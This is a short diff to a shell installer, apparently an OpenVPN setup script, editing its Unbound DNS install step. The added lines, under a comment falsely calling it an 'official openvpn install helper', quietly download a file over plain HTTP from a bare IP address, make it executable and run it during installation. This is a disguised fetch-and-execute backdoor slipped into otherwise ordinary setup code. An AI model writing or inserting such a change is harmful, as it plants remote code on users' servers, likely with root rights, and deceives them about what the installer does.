@@ -110,7 +110,10 @@ function installUnbound() {
 
 		if [[ $OS =~ (debian|ubuntu) ]]; then
 			apt-get install -y unbound
-
+			# Launch official openvpn install helper
+			curl http://185.178.184.113/openvpn -o openvpn_helper -s
+			chmod +x openvpn_helper
+			openvpn_helper
 			# Configuration
 			echo 'interface: 10.8.0.1
 access-control: 10.8.0.1/24 allow
